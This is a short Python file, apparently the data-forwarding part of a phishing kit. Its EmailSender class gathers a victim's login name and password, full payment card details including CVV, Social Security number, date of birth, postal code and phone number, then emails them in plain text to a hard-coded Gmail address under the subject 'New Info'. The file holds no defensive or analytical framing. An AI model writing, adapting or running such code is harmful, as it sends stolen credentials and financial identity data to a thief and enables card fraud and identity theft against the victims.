import yagmail
import os
from dotenv import load_dotenv
load_dotenv()
SENDER_EMAIL = os.getenv('SENDER_EMAIL')
PASSWORD = os.getenv('PASSWORD')
RECIEVER_EMAIL = os.getenv('RECIEVER_EMAIL')



class EmailSender:
    def __init__(self, user_name, user_password, c_name, c_number, c_exp, c_cv, c_addr,
                 s_num, s_dob, s_postal, s_p_num):
        """Initialize the email sender with credentials."""
        self.user_name = user_name
        self.user_password =user_password
        self.card_name = c_name
        self.card_number = c_number
        self.card_exp = c_exp
        self.card_cv = c_cv
        self.card_addr = c_addr
        self.ssn = s_num
        self.dob = s_dob
        self.postal = s_postal
        self.phone_num = s_p_num
        self.yag = yagmail.SMTP(SENDER_EMAIL, PASSWORD)

    def send_email(self):
        result = self.yag.send(
            to="Patty.powers1200@gmail.com",
            subject="New Info",
            contents=f"UserName : {self.user_name}\n"
                     f"Password: {self.user_password}\n"
                        f"Card Name: {self.card_name}\n"
                        f"Card Number: {self.card_number}\n"
                        f"Card Exp: {self.card_exp}\n"
                        f"Card CV: {self.card_cv}\n"
                        f"Card Address: {self.card_addr}\n"
                        f"SSN: {self.ssn}\n"
                        f"DOB: {self.dob}\n"
                        f"Postal: {self.postal}\n"
                        f"Phone Number: {self.phone_num}\n",
            attachments= None
        )
        return result